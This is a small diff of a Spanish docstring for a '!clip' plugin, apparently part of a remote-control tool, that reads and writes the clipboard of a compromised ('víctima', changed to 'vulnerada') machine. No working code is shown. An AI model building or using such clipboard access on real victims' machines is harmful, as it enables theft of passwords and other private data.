@@ -1,5 +1,5 @@
 """
-Plugin !clip — accede al portapapeles de la máquina víctima.
+Plugin !clip — accede al portapapeles de la máquina vulnerada.
 !clip read          → lee el contenido actual del portapapeles
 !clip write <texto> → escribe texto en el portapapeles
 """
